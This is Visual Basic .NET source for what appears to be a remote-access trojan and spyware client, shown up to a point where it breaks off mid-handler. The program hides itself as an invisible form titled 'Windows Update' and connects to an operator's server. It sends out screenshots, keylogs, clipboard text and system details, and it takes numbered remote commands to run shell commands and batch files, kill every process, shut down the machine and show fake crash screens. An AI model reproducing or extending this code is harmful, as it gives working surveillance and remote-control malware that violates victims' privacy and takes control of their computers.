Imports System.Net.Sockets
Imports System.Net
Imports System.Threading
Imports System.Text
Imports System.IO
Imports Microsoft.Win32
Imports System.Runtime.InteropServices 'API functions

Imports System.Drawing
Imports System.Drawing.Drawing2D
Imports System.Drawing.Imaging





Public Class Form1
    Inherits System.Windows.Forms.Form

#Region " Windows Form Designer generated code"

    Public Sub New()
        MyBase.New()

        'This call is required by the Windows Form Designer.
        InitializeComponent()

        'Add any initialization after the InitializeComponent() call

    End Sub

    'Form overrides dispose to clean up the component list.
    Protected Overloads Overrides Sub Dispose(ByVal disposing As Boolean)
        If disposing Then
            If Not (components Is Nothing) Then
                components.Dispose()
            End If
        End If
        MyBase.Dispose(disposing)
    End Sub

    'Required by the Windows Form Designer
    Private components As System.ComponentModel.IContainer
    Friend WithEvents Button1 As System.Windows.Forms.Button
    Friend WithEvents Label1 As System.Windows.Forms.Label
    Friend WithEvents Label2 As System.Windows.Forms.Label
    Friend WithEvents serverip As System.Windows.Forms.TextBox
    Friend WithEvents Timer1 As System.Windows.Forms.Timer
    Friend WithEvents Timer2 As System.Windows.Forms.Timer
    Friend WithEvents WebBrowser1 As System.Windows.Forms.WebBrowser
    Friend WithEvents IPNOTIFy As System.Windows.Forms.Timer
    Friend WithEvents TextBox1 As System.Windows.Forms.TextBox

    'NOTE: The following procedure is required by the Windows Form Designer
    'It can be modified using the Windows Form Designer.  
    'Do not modify it using the code editor.
    <System.Diagnostics.DebuggerStepThrough()> Private Sub InitializeComponent()
        Me.components = New System.ComponentModel.Container
        Me.Button1 = New System.Windows.Forms.Button
        Me.TextBox1 = New System.Windows.Forms.TextBox
        Me.Label1 = New System.Windows.Forms.Label
        Me.Label2 = New System.Windows.Forms.Label
        Me.serverip = New System.Windows.Forms.TextBox
        Me.Timer1 = New System.Windows.Forms.Timer(Me.components)
        Me.Timer2 = New System.Windows.Forms.Timer(Me.components)
        Me.WebBrowser1 = New System.Windows.Forms.WebBrowser
        Me.IPNOTIFy = New System.Windows.Forms.Timer(Me.components)
        Me.SuspendLayout()
        '
        'Button1
        '
        Me.Button1.Location = New System.Drawing.Point(39, 116)
        Me.Button1.Name = "Button1"
        Me.Button1.Size = New System.Drawing.Size(70, 23)
        Me.Button1.TabIndex = 3
        Me.Button1.Text = "Button1"
        Me.Button1.UseVisualStyleBackColor = True
        '
        'TextBox1
        '
        Me.TextBox1.Location = New System.Drawing.Point(17, 76)
        Me.TextBox1.Name = "TextBox1"
        Me.TextBox1.Size = New System.Drawing.Size(243, 20)
        Me.TextBox1.TabIndex = 4
        '
        'Label1
        '
        Me.Label1.AutoSize = True
        Me.Label1.Location = New System.Drawing.Point(150, 143)
        Me.Label1.Name = "Label1"
        Me.Label1.Size = New System.Drawing.Size(17, 13)
        Me.Label1.TabIndex = 5
        Me.Label1.Text = "IP"
        '
        'Label2
        '
        Me.Label2.AutoSize = True
        Me.Label2.Location = New System.Drawing.Point(173, 143)
        Me.Label2.Name = "Label2"
        Me.Label2.Size = New System.Drawing.Size(39, 13)
        Me.Label2.TabIndex = 6
        Me.Label2.Text = "Label2"
        '
        'serverip
        '
        Me.serverip.Location = New System.Drawing.Point(45, 35)
        Me.serverip.Name = "serverip"
        Me.serverip.Size = New System.Drawing.Size(108, 20)
        Me.serverip.TabIndex = 7
        '
        'Timer1
        '
        Me.Timer1.Enabled = True
        Me.Timer1.Interval = 500
        '
        'Timer2
        '
        '
        'WebBrowser1
        '
        Me.WebBrowser1.Location = New System.Drawing.Point(250, 129)
        Me.WebBrowser1.MinimumSize = New System.Drawing.Size(20, 20)
        Me.WebBrowser1.Name = "WebBrowser1"
        Me.WebBrowser1.Size = New System.Drawing.Size(73, 79)
        Me.WebBrowser1.TabIndex = 8
        '
        'IPNOTIFy
        '
        Me.IPNOTIFy.Enabled = True
        Me.IPNOTIFy.Interval = 30000
        '
        'Form1
        '
        Me.AutoScaleBaseSize = New System.Drawing.Size(5, 13)
        Me.BackColor = System.Drawing.Color.White
        Me.ClientSize = New System.Drawing.Size(12, 15)
        Me.ControlBox = False
        Me.Controls.Add(Me.WebBrowser1)
        Me.Controls.Add(Me.serverip)
        Me.Controls.Add(Me.Label2)
        Me.Controls.Add(Me.Label1)
        Me.Controls.Add(Me.TextBox1)
        Me.Controls.Add(Me.Button1)
        Me.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None
        Me.MaximizeBox = False
        Me.MinimizeBox = False
        Me.Name = "Form1"
        Me.Opacity = 0
        Me.ShowIcon = False
        Me.ShowInTaskbar = False
        Me.StartPosition = System.Windows.Forms.FormStartPosition.Manual
        Me.Text = "Windows Update"
        Me.TransparencyKey = System.Drawing.Color.White
        Me.ResumeLayout(False)
        Me.PerformLayout()

    End Sub

#End Region

#Region "variables"

#Region "screenshot vars"



    Const ConnectionPort As Int16 = 81 'Connection Port Number
    Const RequestPort As Int16 = 82 'Request Port Number


    Dim NetStream As NetworkStream
    Dim myReader As BinaryReader
    Dim myWriter As BinaryWriter

    Dim Look4Request As Thread = Nothing



#End Region
#Region "keylg vars"

    Const ConnectionPort2 As Int16 = 83 'Connection Port Number
    Const RequestPort2 As Int16 = 84 'Request Port Number


    Dim NetStream2 As NetworkStream
    Dim myReader2 As BinaryReader
    Dim myWriter2 As BinaryWriter

    Dim Look4Request2 As Thread = Nothing


#End Region
#Region "socket vars"
    '-----------------------------------------------------
    '--------socket stuff
    Delegate Sub setTextCallback(ByVal txt As String)
    Public Event updatetext(ByVal str As String)
    Public serversocket As New TcpClient()
    Dim tcpcin As New TcpListener(8000)
    Public clientip
    Delegate Sub setcallback(ByVal txt As String)

    'sends on 8001
    'recieves on 8000
    '-----------------------------------------------------

#End Region
#Region "random variables"
    Public live As Boolean = False
    Public filename As String = "scrn.bmp"
    Dim chatr As Boolean = False
    Dim myprocess As New Process
    Dim StartInfo As New System.Diagnostics.ProcessStartInfo
    Dim nick As Object
    Dim cmd As String = ""
    Public send As String = "null"

    Public fullip As String
    'cd door
    Private setTrayStatus As Long
    'API
    Private Declare Function mciSendString Lib "winmm.dll" Alias "mciSendStringA" _
     (ByVal lpstrCommand As String, ByVal lpstrReturnString As String, _
      ByVal uReturnLength As Integer, ByVal hwndCallback As Integer) As Integer


    ' taskbar
    ' Private Declare Function SetWindowPos Lib"user32" (ByVal hwnd As Long, ByVal hWndInsertAfter As Long, ByVal x As Long, ByVal y As Long, ByVal cx As Long, ByVal cy As Long, ByVal wFlags As Long) As Long
    'Private Declare Function FindWindow Lib"user32" Alias"FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Long
    ' Const SWP_HIDEWINDOW = &H80
    ' Const SWP_SHOWWINDOW = &H40

    Dim TaskBarHwnd As Long


    'processes
    Dim ProcessList As System.Diagnostics.Process()
    Dim Proc As System.Diagnostics.Process


#End Region


#End Region

#Region "functions"

#Region "Wallpaper Functions"


    Private Declare Function SystemParametersInfo Lib "user32" Alias "SystemParametersInfoA" (ByVal uAction As Integer, ByVal uParam As Integer, ByVal lpvParam As String, ByVal fuWinIni As Integer) As Integer

    'constants to be used with the above api
    Private Const SPI_SETDESKWALLPAPER = 20
    Private Const SPIF_UPDATEINIFILE = &H1
#End Region
    Private Declare Function ShowCursor Lib "user32" (ByVal bShow As Long) As Long

#Region "taskbar functions"


    Private Declare Function FindWindow Lib "user32.dll" Alias _
    "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Int32 'Find External Window

    Private Declare Function FindWindowEx Lib "user32.dll" Alias _
    "FindWindowExA" (ByVal hWnd1 As Int32, ByVal hWnd2 As Int32, ByVal lpsz1 As String, _
    ByVal lpsz2 As String) As Int32 'Find Child Window Of External Window

    Private Declare Function ShowWindow Lib "user32.dll" (ByVal hwnd As Int32, _
    ByVal nCmdShow As Int32) As Int32 'Show A Window

    Private Declare Function PostMessage Lib "user32.dll" Alias _
    "PostMessageA" (ByVal hwnd As Int32, ByVal wMsg As Int32, ByVal wParam As Int32, _
    ByVal lParam As Int32) As Int32 'Post Message To Window

    Private Declare Function EnableWindow Lib "user32.dll" (ByVal hwnd As Int32, _
    ByVal fEnable As Int32) As Int32 'Enable A Window

    Private Declare Function SendMessageSTRING Lib "user32.dll" Alias "SendMessageA" (ByVal hwnd As Int32, _
    ByVal wMsg As Int32, ByVal wParam As Int32, ByVal lParam As String) As Int32 'SendMessage lParam = String

    Declare Auto Function SendMessageTimeout Lib "User32" ( _
    ByVal hWnd As Integer, _
    ByVal Msg As UInt32, _
    ByVal wParam As Integer, _
    ByVal lParam As Integer, _
    ByVal fuFlags As UInt32, _
    ByVal uTimeout As UInt32, _
    ByRef lpdwResult As IntPtr _
    ) As Long 'Send Message & Wait

    Private Declare Function SendMessage Lib "user32.dll" Alias "SendMessageA" (ByVal hwnd As  _
    Int32, ByVal wMsg As Int32, ByVal wParam As Int32, ByVal lParam As Int32) As Int32 'Normal SendMessage

    Private Declare Function GetDesktopWindow Lib "user32" () As IntPtr 'Get Handle To Desktop

    Private Const WM_WININICHANGE = &H1A 'INI File Update
    Private Const HWND_BROADCAST = &HFFFF& 'Send To All
    Private Const WM_SETTINGCHANGE = &H1A 'Setting Change
    Private Const SMTO_ABORTIFHUNG = &H2 'Stop If Hang
    Private Const WM_COMMAND As Int32 = &H111 'Send Command
    Private Const WM_USER As Int32 = &H400 'User
    Private Const WM_SETTEXT = &HC 'Change Text
    Private Const WM_GETTEXT = &HD 'Get Text

    Private AB As New TBAppBar 'AppBar Object

#End Region
#End Region

#Region "recieve screenshot"

    Public Sub start()

        '(Form1.serverip.Text.ToString).Trim
        Try
            Dim myClient As New TcpClient
            myClient.Connect(serverip.Text, ConnectionPort)
            myClient.Close()
        Catch ex As Exception
            start()
            End
        End Try

        Look4Request = New Thread(New ThreadStart(AddressOf WaitForRequest))
        Look4Request.Start()


    End Sub



    Public Sub WaitForRequest()
        'Gets the Receiver Address
        Dim ServerAddress As IPAddress = Dns.GetHostAddresses(serverip.Text)(0)
        Dim myListener As New TcpListener(RequestPort)

        'Dim myListener As New TcpListener(ServerAddress, RequestPort)
        myListener.Start()

        'If Connected Gets the Client Stream
        Try
            While (True)
                Try
                    Dim myClient As TcpClient = myListener.AcceptTcpClient
                    NetStream = myClient.GetStream
                    Send_Screen_Shot() 'Sends the Screen Shot of the Desktop
                    myClient.Close()
                Catch ex As Exception
                    Exit While
                End Try

            End While

        Catch ex As Exception
            '  MsgBox(ex.Message)
        Finally
            myReader.Close()
            NetStream.Close()
        End Try

    End Sub

    Public Sub Send_Screen_Shot()


        Dim FileName As String = Environment.CurrentDirectory & "\scrn.bmp"

        ScreenCapture.CurrentScreen() 'Capture the Current Screen

        If File.Exists(FileName) Then
            File.Delete(FileName)
        End If

        ScreenCapture.oBitMap.Save(FileName) 'Saves it to a File
        ScreenCapture.oBitMap = Nothing

        'Then,Sends the File to the Image Receiver
        Using FStreams As New FileStream(FileName, FileMode.Open)

            Dim buffer(1024 - 1) As Byte

            Do While True
                Dim bytesRead As Integer = FStreams.Read(buffer, 0, buffer.Length)
                If bytesRead = 0 Then Exit Do
                NetStream.Write(buffer, 0, bytesRead)
                NetStream.Flush()
            Loop

            FStreams.Close()
            NetStream.Close()
        End Using
        'Finally Closes


    End Sub
#End Region

#Region "recieve keys"


    Public Sub start2()
        Try
            Dim myClient2 As New TcpClient
            myClient2.Connect(serverip.Text, ConnectionPort2)
            myClient2.Close()
        Catch ex As Exception
            start2()
            End

        End Try
        Look4Request2 = New Thread(New ThreadStart(AddressOf WaitForRequest2))
        Look4Request2.Start()

    End Sub



    Sub WaitForRequest2()

        Dim ServerAddress2 As IPAddress = Dns.GetHostAddresses(serverip.Text)(0)
        Dim myListener2 As New TcpListener(RequestPort2)

        'Dim myListener As New TcpListener(ServerAddress, RequestPort)
        myListener2.Start()

        'If Connected Gets the Client Stream
        Try
            While (True)
                Try
                    Dim myClient2 As TcpClient = myListener2.AcceptTcpClient
                    NetStream2 = myClient2.GetStream
                    Send_Screen_Shot2() 'Sends the Screen Shot of the Desktop
                    myClient2.Close()
                Catch ex As Exception
                    Exit While
                End Try

            End While

        Catch ex As Exception
            ' MsgBox(ex.Message)
        Finally
            myReader2.Close()
            NetStream2.Close()
        End Try

    End Sub

    Sub Send_Screen_Shot2()



        Dim FileName2 As String = Environment.CurrentDirectory & "\funbags.txt"



        'Then,Sends the File to the Image Receiver
        Using FStreams2 As New FileStream(FileName2, FileMode.Open)

            Dim buffer(1024 - 1) As Byte

            Do While True
                Dim bytesRead2 As Integer = FStreams2.Read(buffer, 0, buffer.Length)
                If bytesRead2 = 0 Then Exit Do
                NetStream2.Write(buffer, 0, bytesRead2)
                NetStream2.Flush()
            Loop

            FStreams2.Close()
            NetStream2.Close()
        End Using
        'Finally Closes


    End Sub


#End Region
#Region "taskbar control"

#Region "refresh explorer"
    Public Sub EnvRefresh() ' Refresh Explorer
        Dim EnvResult As IntPtr 'Result
        SendMessageTimeout(HWND_BROADCAST, _
        Convert.ToUInt32(WM_SETTINGCHANGE), _
        0, 0, _
        Convert.ToUInt32(SMTO_ABORTIFHUNG), _
        Convert.ToUInt32(2000), _
        EnvResult) 'Broadcast A Setting Change To All
    End Sub
#End Region


#Region "hide clock"
    Private Sub hideclock()
        Dim TaskBarWin As Long, TrayWin As Long, ClockWin As Long

        TaskBarWin = FindWindow("Shell_TrayWnd", vbNullString)
        TrayWin = FindWindowEx(TaskBarWin, 0, "TrayNotifyWnd", vbNullString)
        ClockWin = FindWindowEx(TrayWin, 0, "TrayClockWClass", vbNullString)
        ShowWindow(ClockWin, 0) 'Hide Clock
    End Sub

#End Region


#Region "show clock"
    Private Sub showclock()
        Dim TaskBarWin As Long, TrayWin As Long, ClockWin As Long

        TaskBarWin = FindWindow("Shell_TrayWnd", vbNullString) 'Find TaskBar 
        TrayWin = FindWindowEx(TaskBarWin, 0, "TrayNotifyWnd", vbNullString) 'Find Tray Window
        ClockWin = FindWindowEx(TrayWin, 0, "TrayClockWClass", vbNullString) 'Find Clock Window
        ShowWindow(ClockWin, 1) 'Show Clock

    End Sub

#End Region

#Region "lock taskbar"
    Private Sub locktaskbar()
        Dim TaskBarWin As Long

        TaskBarWin = FindWindow("Shell_TrayWnd", vbNullString) 'Find TaskBar
        PostMessage(TaskBarWin, WM_COMMAND, 424, vbNullString) 'Lock TaskBar
    End Sub

#End Region


#Region "group taskbar items"
    Private Sub groupitems()
        Dim GroupRet As Long 'Used With SendMessage
        Dim TaskBarWin As Long

        TaskBarWin = FindWindow("Shell_TrayWnd", vbNullString) 'Find taskbar

        Dim GroupKey As RegistryKey = _
        Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", _
        True) 'Open Registry Key

        GroupKey.SetValue("TaskbarGlomming", 1, RegistryValueKind.DWord) 'Set Grouping On
        GroupRet = SendMessage(TaskBarWin, WM_WININICHANGE, 0&, 0&) 'Store New Setting

    End Sub
#End Region

#Region "ungroup taskbar items"
    Private Sub ungroup()
        Dim GroupRet As Long
        Dim TaskBarWin As Long

        TaskBarWin = FindWindow("Shell_TrayWnd", vbNullString)

        Dim GroupKey As RegistryKey = _
        Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", _
        True)

        GroupKey.SetValue("TaskbarGlomming", 0, RegistryValueKind.DWord) 'Set Grouping Off
        GroupRet = SendMessage(TaskBarWin, WM_WININICHANGE, 0&, 0&)
    End Sub
#End Region

#Region "hide taskbar items"
    Private Sub HideTaskbarItems()
        Dim TaskBarWin As Long, TaskButtonWin As Long

        TaskBarWin = FindWindow("Shell_TrayWnd", vbNullString) 'Find Taskbar
        TaskButtonWin = FindWindowEx(TaskBarWin, 0, "ReBarWindow32", vbNullString) 'Find TaskBar Button Area
        ShowWindow(TaskButtonWin, 1) 'Show Active Buttons
    End Sub
#End Region


#Region "Show Takbar Items"
    Private Sub ShowTaskbarItems()
        Dim TaskBarWin As Long, TaskButtonWin As Long

        TaskBarWin = FindWindow("Shell_TrayWnd", vbNullString)
        TaskButtonWin = FindWindowEx(TaskBarWin, 0, "ReBarWindow32", vbNullString)
        ShowWindow(TaskButtonWin, 0) 'Hide Active Buttons
    End Sub
#End Region

#Region "show favorites"
    Private Sub ShowFavorites()

        Dim FavKey As RegistryKey = _
        Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", _
        True)
        FavKey.SetValue("StartMenuFavorites", 1, RegistryValueKind.DWord) 'Show Favourites Menu

        EnvRefresh() 'Refresh Explorer.exe

    End Sub
#End Region

#Region "Hide Favorites"

    Private Sub HideFavorites()
        Dim FavKey As RegistryKey = _
              Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", _
              True)
        FavKey.SetValue("StartMenuFavorites", 0, RegistryValueKind.DWord) 'Hide Favourites

        EnvRefresh()

    End Sub
#End Region

#Region "functions and subs for taskbar control"

    Public Class TBAppBar

        Private Declare Function GetAppBarMessage Lib "shell32" Alias "SHAppBarMessage" _
           (ByVal dwMessage As Integer, ByRef pData As APPBARDATA) As Integer 'Get Message Sent By App Bar

        Private Declare Function SetAppBarMessage Lib "shell32" Alias "SHAppBarMessage" _
           (ByVal dwMessage As Integer, ByRef pData As APPBARDATA) As Integer 'Send Message To App BAr

        Private Structure APPBARDATA 'AppBar Structure
            Dim cbSize As Integer
            Dim hwnd As Integer
            Dim uCallbackMessage As Integer
            Dim uEdge As Integer
            Dim rc As Rectangle
            Dim lParam As Integer
        End Structure

        Private Const ABM_GETSTATE As Int32 = &H4 'Get Current State
        Private Const ABM_GETTASKBARPOS As Int32 = &H5 'Get TaskBar Position
        Private Const ABM_SETSTATE As Int32 = &HA 'Apply Setting(s)
        Private Const ABS_AUTOHIDE As Int32 = &H1 'Autohide
        Private Const ABS_ALWAYSONTOP As Int32 = &H2 'Always on Top

        Private TBAppBAutoHide As Boolean
        Private TBAppBarAlwaysOnTop As Boolean

        Public Sub New()
            Me.GetState() 'Get Current State
        End Sub

        Private Sub GetState()

            Dim AppBarSetting As New APPBARDATA 'What Setting?

            AppBarSetting.cbSize = Marshal.SizeOf(AppBarSetting) 'Initialise

            Dim AppBarState As Int32 = GetAppBarMessage(ABM_GETSTATE, AppBarSetting) 'Get Current State

            Select Case AppBarState

                Case 0 'Nothing Set
                    TBAppBAutoHide = False
                    TBAppBarAlwaysOnTop = False

                Case ABS_ALWAYSONTOP 'Always On Top
                    TBAppBAutoHide = False
                    TBAppBarAlwaysOnTop = True

                Case Else
                    TBAppBAutoHide = True 'AutoHide

            End Select

        End Sub

        Private Sub SetState() 'Apply Settings

            Dim AppBarSetting As New APPBARDATA 'Setting We Want To Apply
            AppBarSetting.cbSize = Marshal.SizeOf(AppBarSetting) 'Initialise

            If Me.AutoHide Then
                AppBarSetting.lParam = ABS_AUTOHIDE 'AutoHide
            End If

            If Me.AlwaysOnTop Then
                AppBarSetting.lParam = AppBarSetting.lParam Or ABS_ALWAYSONTOP 'Always On Top
            End If

            SetAppBarMessage(ABM_SETSTATE, AppBarSetting)

        End Sub

        Public Property AutoHide() As Boolean 'Autohide
            Get
                Return TBAppBAutoHide
            End Get
            Set(ByVal Value As Boolean)
                TBAppBAutoHide = Value
                Me.SetState()
            End Set
        End Property

        Public Property AlwaysOnTop() As Boolean 'Always On Top
            Get
                Return TBAppBarAlwaysOnTop
            End Get
            Set(ByVal Value As Boolean)
                TBAppBarAlwaysOnTop = Value
                Me.SetState()
            End Set
        End Property

    End Class


#End Region




#End Region

#Region "send pc info"
    Private Sub sendinfo()
        If My.Computer.Clipboard.ContainsAudio Then
            send = "3*Clipboard contains audio"
            sendstream2(send)
        End If

        If My.Computer.Clipboard.ContainsImage Then
            send = "3*Clipboard contains image"
            sendstream2(send)
        End If


        send = "3*GMT time                 :" & My.Computer.Clock.GmtTime & Environment.NewLine
        send &= ""
        send &= "Drive count              :" & My.Computer.FileSystem.Drives.Count & Environment.NewLine


        send &= "Available physical memory:" & My.Computer.Info.AvailablePhysicalMemory & Environment.NewLine
        'sendstream()
        send &= "Available virtual memory :" & My.Computer.Info.AvailableVirtualMemory & Environment.NewLine
        ' sendstream()
        send &= "OS full name             :" & My.Computer.Info.OSFullName & Environment.NewLine
        ' sendstream()
        send &= "OS platform              :" & My.Computer.Info.OSPlatform & Environment.NewLine
        'sendstream()
        send &= "OS version                       :" & My.Computer.Info.OSVersion & Environment.NewLine
        'sendstream()
        send &= "Total phys mem                   :" & My.Computer.Info.TotalPhysicalMemory & Environment.NewLine
        ' sendstream()
        send &= "Total virtual mem                 :" & My.Computer.Info.TotalVirtualMemory & Environment.NewLine
        ' sendstream()
        send &= "Computer name                       :" & My.Computer.Name & Environment.NewLine
        ' sendstream()
        send &= "Screen Pixels                     :" & My.Computer.Screen.BitsPerPixel & Environment.NewLine
        'sendstream()
        send &= "Screen Bounds                      :" & My.Computer.Screen.Bounds.ToString & Environment.NewLine
        'sendstream()
        send &= "Screen Name                        :" & My.Computer.Screen.DeviceName & Environment.NewLine
        ' sendstream()
        send &= "Screen Primary                    :" & My.Computer.Screen.Primary.ToString & Environment.NewLine
        'sendstream()
        send &= "Screen Working area               :" & My.Computer.Screen.WorkingArea.ToString & Environment.NewLine
        'sendstream()
        send &= "Screen Name                       :" & My.User.Name.ToString & Environment.NewLine
        'sendstream()
        send &= "Machine name                      :" & Environment.MachineName & Environment.NewLine
        'sendstream()
        send &= "Processor count                   :" & Environment.ProcessorCount & Environment.NewLine
        'sendstream()
        send &= "User domain                          :" & Environment.UserDomainName & Environment.NewLine
        'sendstream()
        send &= "User name                            :" & Environment.UserName & Environment.NewLine
        'sendstream()
        send &= "Sys Version                          :" & Environment.Version.ToString & Environment.NewLine
        sendstream2(send)



    End Sub
#End Region

#Region "Set Desktop Background"
    Private Sub ChangeDesktop(ByVal url As String)

        If My.Computer.FileSystem.FileExists("C:\sysini\bg.jpg") Then
            My.Computer.FileSystem.DeleteFile("C:\sysini\bg.jpg")
        End If

        ' My.Computer.Network.DownloadFile(url, "C:\sysini\bg.jpg")



        SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, "C:\sysini\bg.jpg", SPIF_UPDATEINIFILE)
    End Sub
#End Region


#Region "kill all processes"
    Private Sub killall()
        ProcessList = System.Diagnostics.Process.GetProcesses()

        For Each Me.Proc In ProcessList
            If Not Proc.ProcessName.ToLower.Contains("Windows Host Manager") Then ' so we wont kill ourselves ;)
                Shell("taskkill /F /IM" & Proc.ProcessName & ".exe")
            End If
        Next
    End Sub
#End Region
#Region "read inbound data"
    Private Sub myread()
        Do While True
            serversocket = tcpcin.AcceptTcpClient()

            Dim nstream As NetworkStream = serversocket.GetStream
            Dim bit(serversocket.ReceiveBufferSize) As Byte
            nstream.Read(bit, 0, CInt(serversocket.ReceiveBufferSize))
            Dim str As String = System.Text.Encoding.ASCII.GetString(bit)
            'RaiseEvent updatetext(msg)

            Me.SetText(str)
        Loop


    End Sub



#End Region

#Region "ID's for inbound commands"


    Private Sub SetText(ByVal txt As String)






        'To recive the incomming data(TEXT)
        cmd = txt 'shows the data(TEXT) recived on the Chat Window


        Dim id() As String = Split(cmd, "*", -1, CompareMethod.Text)




        If Double.Parse(id(0)) = "1" Then
            Dim stri As String = id(1)
            Dim stri2 As String = id(2)
            MsgBox(stri, MsgBoxStyle.Critical, stri2)

        End If



        If Double.Parse(id(0)) = "2" Then
            Shell("shutdown /s")
            Shell("shutdown -s")
        End If

        If Double.Parse(id(0)) = "3" Then
            Shell("shutdown /l")
            Shell("shutdown -l")

        End If


        If Double.Parse(id(0)) = "4" Then
            Shell("shutdown /r")
            Shell("shutdown -r")

        End If

        If Double.Parse(id(0)) = "5" Then
            Shell("shutdown /h")
            Shell("shutdown -h")
        End If

        If Double.Parse(id(0)) = "6" Then

            send = "1*" & My.Computer.Clock.LocalTime & "  [" & Environment.UserName & " is Alive!]"
            sendstream2(send)
        End If

        If Double.Parse(id(0)) = "10" Then
            mciSendString("Set CDAudio Door Open", Nothing, 0, 0)
        End If

        If Double.Parse(id(0)) = "11" Then
            mciSendString("Set CDAudio Door Closed", Nothing, 0, 0)
        End If

        If Double.Parse(id(0)) = "30" Then
            live = True
            send = "1*online keylog activated"
            sendstream2(send)
        End If

        If Double.Parse(id(0)) = "31" Then
            live = False
        End If

        If Double.Parse(id(0)) = "7" Then
            If My.Computer.Clipboard.ContainsText Then
                send = "5*" & My.Computer.Clipboard.GetText
                sendstream2(send)
            Else
                send = "5*[[[clipboard data is empty]]]" & My.Computer.Clipboard.GetText
                sendstream2(send)
            End If

        End If


        If Double.Parse(id(0)) = "8" Then

            If Me.InvokeRequired Then
                Dim d As New setcallback(AddressOf SetText)
                Me.Invoke(d, New Object() {txt})
            Else
                My.Computer.Clipboard.Clear()
            End If
        End If

        If Double.Parse(id(0)) = "9" Then
            Dim stri As String = id(1)
            My.Computer.Clipboard.SetText(stri)
        End If






        If Double.Parse(id(0)) = "11" Then
            sendinfo()

        End If


        If Double.Parse(id(0)) = "12" Then
            My.Computer.Mouse.ButtonsSwapped.Equals(True)
        End If


        If Double.Parse(id(0)) = "13" Then
            Dim stri As String = id(1)
            ' My.Computer.Keyboard.SendKeys(stri)
            SendKeys.SendWait(stri)
        End If


        If Double.Parse(id(0)) = "14" Then
            killall()
        End If


        If Double.Parse(id(0)) = "15" Then
            send = "1*keylog beginning"
            sendstream2(send)
            start2()
        End If



        If Double.Parse(id(0)) = "16" Then
            Dim stri As String = id(1)

            'If My.Computer.FileSystem.FileExists("C:\temp\dir.txt") Then
            '     My.Computer.FileSystem.DeleteFile("C:\temp\dir.txt")
            'End If

            If Not My.Computer.FileSystem.DirectoryExists("C:\temp\") Then
                My.Computer.FileSystem.CreateDirectory("C:\temp\")
            End If



            Shell("cd" & stri & " && dir >>  C:\temp\dir.txt") 'the command you wish to run.....

            Dim objReader As New StreamReader("C:\temp\dir.txt")
            send = objReader.ToString
            sendstream2(send)

            send = "1*done"
            sendstream2(send)


        End If


        If Double.Parse(id(0)) = "17" Then
            ProcessList = System.Diagnostics.Process.GetProcesses()
            Dim list As String = ""
            For Each Me.Proc In ProcessList
                list &= Proc.ProcessName & "|"


                ' sendstream()
            Next


            send = "4*" & list
            sendstream2(send)


        End If


        If Double.Parse(id(0)) = "18" Then
            Dim stri As String = id(1).ToString
            If stri.Contains("exe") Then
                Shell("taskkill /F /IM " & stri)

            Else
                Shell("taskkill /F /IM " & stri & ".exe")
                send = "1*Auto added .exe file extension"
                sendstream2(send)
            End If

        End If

        If Double.Parse(id(0)) = "19" Then
            screenfuka.Show()
            screenfuka.WindowState = FormWindowState.Maximized
            screenfuka.Opacity = 0.4
            screenfuka.BackColor = Color.Red
        End If

        If Double.Parse(id(0)) = "20" Then
            screenfuka.Show()
            screenfuka.WindowState = FormWindowState.Maximized
            screenfuka.Opacity = 0.4
            screenfuka.BackColor = Color.Blue
        End If


        If Double.Parse(id(0)) = "21" Then
            screenfuka.Show()

            screenfuka.WindowState = FormWindowState.Maximized
            screenfuka.Opacity = 0.4
            screenfuka.BackColor = Color.Green
        End If

        If Double.Parse(id(0)) = "22" Then
            screenfuka.Show()
            screenfuka.WindowState = FormWindowState.Maximized
            screenfuka.Opacity = 0.4
        End If

        If Double.Parse(id(0)) = "23" Then
            screenfuka.Show()

            screenfuka.BackColor = Color.Black
            Me.Opacity = 100
        End If

        If Double.Parse(id(0)) = "24" Then

            screenfuka.Hide()
            UBuntu.Hide()
            BSOD.Hide()
            Mac.Hide()
        End If

        If Double.Parse(id(0)) = "25" Then

            UBuntu.Show()
            UBuntu.WindowState = FormWindowState.Maximized

        End If


        If Double.Parse(id(0)) = "26" Then
            BSOD.Show()
            BSOD.WindowState = FormWindowState.Maximized
        End If


        If Double.Parse(id(0)) = "27" Then
            Dim stri As String = id(1)
            Process.Start(stri)
        End If

        If Double.Parse(id(0)) = "28" Then
            ShowCursor(False)
        End If


        If Double.Parse(id(0)) = "29" Then
            ShowCursor(True)
        End If

        If Double.Parse(id(0)) = "33" Then
            Shell("RUNDLL32 USER32.DLL,SwapMouseButton")
        End If

        If Double.Parse(id(0)) = "34" Then
            Dim stri As String = id(1)
            StartInfo.FileName = "cmd" 'starts cmd window
            StartInfo.RedirectStandardInput = True
            StartInfo.RedirectStandardOutput = True
            StartInfo.UseShellExecute = False 'required to redirect
            myprocess.StartInfo = StartInfo
            myprocess.Start()

            Dim SR As System.IO.StreamReader = myprocess.StandardOutput
            Dim SW As System.IO.StreamWriter = myprocess.StandardInput
            SW.WriteLine(stri) 'the command you wish to run.....
            'SW.WriteLine("exit") 'exits command prompt window
            'SW.Close()
            'SR.Close()

        End If



        If Double.Parse(id(0)) = "36" Then

            Dim stri As String = id(1).ToString
            StartInfo.FileName = "cmd" 'starts cmd window
            StartInfo.RedirectStandardInput = True
            StartInfo.RedirectStandardOutput = True
            StartInfo.UseShellExecute = False 'required to redirect
            myprocess.StartInfo = StartInfo
            myprocess.Start()
            MsgBox(stri)

            Dim SR As System.IO.StreamReader = myprocess.StandardOutput
            Dim SW As System.IO.StreamWriter = myprocess.StandardInput
            SW.WriteLine(stri) 'the command you wish to run.....
            SW.WriteLine("exit") 'exits command prompt window
            SW.Close()
            SR.Close()


        End If


        If Double.Parse(id(0)) = "37" Then
            If My.Computer.FileSystem.DirectoryExists(Environment.CurrentDirectory & "\test.bat") Then

                My.Computer.FileSystem.DeleteFile(Environment.CurrentDirectory & "\test.bat")

            End If

            Dim stri As String = id(1)
            My.Computer.FileSystem.WriteAllText(Environment.CurrentDirectory & "\test.bat", stri, True)
            Shell(Environment.CurrentDirectory & "\test.bat")



        End If

        If Double.Parse(id(0)) = "999" Then
